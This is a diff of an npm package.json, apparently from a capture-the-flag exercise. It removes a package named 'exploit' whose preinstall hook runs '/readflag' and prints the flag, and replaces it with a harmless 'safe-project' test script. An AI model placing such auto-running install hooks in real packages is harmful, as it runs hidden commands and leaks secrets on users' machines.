@@ -1,7 +1,7 @@
 {
-  "name": "exploit",
+  "name": "safe-project",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "/readflag > flag.txt; cat flag.txt"
+    "test": "echo 'Safe'"
   }
 }
